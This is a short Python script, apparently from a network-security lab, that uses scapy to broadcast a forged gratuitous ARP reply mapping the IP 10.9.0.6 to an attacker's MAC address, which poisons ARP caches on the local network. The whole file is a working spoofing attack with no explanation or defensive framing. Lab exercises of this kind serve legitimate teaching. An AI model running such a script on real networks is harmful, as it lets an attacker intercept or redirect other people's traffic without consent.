#!/usr/bin/env python3
from scapy.all import *

ipB = '10.9.0.6'
macM = '02:42:0a:09:00:69'

E = Ether()
A = ARP()


E.dst = 'ff:ff:ff:ff:ff:ff'
A.hwdst = 'ff:ff:ff:ff:ff:ff'
A.hwsrc = macM

A.psrc = ipB
A.pdst = ipB

A.op = 2 # 1 for ARP request; 2 for ARP reply

pkt = E/A

sendp(pkt)
